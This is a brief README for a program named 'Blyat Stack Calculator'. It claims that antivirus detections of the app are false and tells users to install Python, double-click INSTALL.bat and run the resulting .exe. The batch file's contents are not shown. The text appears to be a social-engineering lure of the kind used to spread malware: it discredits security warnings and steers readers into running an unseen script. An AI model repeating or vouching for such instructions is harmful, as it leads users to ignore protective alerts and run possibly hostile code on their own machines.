Hey there!

Thanks for downloading Blyat Stack Calculator. Some antivirus programs falsely flag the app as a virus (they're just scared of how powerful it is).

To avoid this, you'll compile it yourself—don’t worry, it’s easy!

1. Install Python from https://www.python.org/downloads/
   - Make sure to check “Add Python to PATH” during installation.

2. Double-click INSTALL.bat
   - It’ll build the app for you. It may take a while so please be patient

3. Use the generated Blyat Stack Calculator.exe from now on.
